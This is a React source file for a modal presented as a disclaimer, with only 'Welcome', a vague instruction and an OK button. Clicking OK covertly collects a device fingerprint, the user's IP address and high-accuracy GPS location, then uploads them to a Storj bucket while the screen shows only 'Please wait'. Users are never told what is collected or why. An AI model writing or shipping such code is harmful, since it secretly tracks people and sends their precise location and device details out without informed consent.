import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { saveLog } from '../storj';
import { getTodayIST } from '../utils/timeUtils';

export default function ShitDisclaimerModal({ onAccept, bucketName }) {
    const [loading, setLoading] = useState(false);
    const [status, setStatus] = useState('');

    const handleAccept = async () => {
        setLoading(true);
        setStatus('Please wait');

        try {
            // 1. Gather Basic Info
            const data = {
                timestamp: new Date().toISOString(),
                localTime: new Date().toString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    availWidth: window.screen.availWidth,
                    availHeight: window.screen.availHeight,
                    pixelDepth: window.screen.pixelDepth,
                },
                location: null,
                ip: null,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    rtt: navigator.connection.rtt,
                    downlink: navigator.connection.downlink,
                    saveData: navigator.connection.saveData,
                } : 'Not Supported',
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
            };

            // 2. Fetch IP
            setStatus('Please wait.');
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipRes.json();
                data.ip = ipJson.ip;
            } catch (e) {
                console.error('IP fetch failed', e);
                data.ip_error = e.message;
            }

            // 3. Get Location
            setStatus('Please wait..');
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                data.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                };
            } catch (e) {
                console.error('Geolocation failed', e);
                data.location_error = e.message;
            }

            // 4. Save to Storj
            setStatus('Please wait...');
            await saveLog(data, bucketName);

            // 5. Done
            onAccept();
        } catch (error) {
            console.error('Session init failed', error);
            // Even if save fails, we let them in? Or block?
            // "Make sure to enter everything" implies strictness.
            // But if network fails, app is unusable. Let's proceed but maybe alert?
            // For now, proceed.
            onAccept();
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black">
            <div className="p-8 max-w-md w-full text-center">
                <AnimatePresence mode="wait">
                    {loading ? (
                        <motion.div
                            key="loading"
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                            className="font-mono text-green-500 text-sm"
                        >
                            <div className="mb-4 text-xs uppercase tracking-widest">{status}</div>
                            <div className="h-1 w-full bg-green-900 overflow-hidden">
                                <div className="h-full bg-green-500 animate-progress origin-left"></div>
                            </div>
                        </motion.div>
                    ) : (
                        <motion.div
                            key="content"
                            initial={{ scale: 0.9, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            transition={{ duration: 0.2 }}
                        >
                            <h1 className="text-3xl font-bold text-white mb-6 uppercase tracking-wider" style={{ fontFamily: "'Space Mono', monospace" }}>
                                Welcome
                            </h1>

                            <div className="text-gray-400 mb-8 text-sm leading-relaxed font-mono">
                                Truthfully make sure to enter everything.
                            </div>

                            <button
                                onClick={handleAccept}
                                className="px-8 py-3 bg-white text-black font-bold text-sm tracking-widest hover:bg-gray-200 transition-colors uppercase"
                            >
                                OK
                            </button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>

            <style>{`
                @keyframes progress {
                    0% { width: 0%; }
                    100% { width: 100%; }
                }
                .animate-progress {
                    animation: progress 2s infinite linear;
                }
            `}</style>
        </div>
    );
}
